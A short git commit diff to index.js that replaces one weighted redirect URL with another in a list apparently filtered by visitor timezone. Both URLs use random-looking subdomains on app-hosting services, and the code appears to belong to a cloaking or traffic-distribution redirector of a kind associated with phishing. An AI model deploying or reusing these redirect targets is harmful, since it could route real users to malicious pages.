2277f64e2ec263cf3d6f035882cc5dc2541e0306
paalakash <palaksh452@gmail.com>
2026-07-13 05:24:09 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://hammerhead-app-7o2uv.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
+    { url: "https://gtddtfygyghgv.on-forge.com/werrx01USAHTML/?bcda", weight: 1.0 }
     
 ];
 
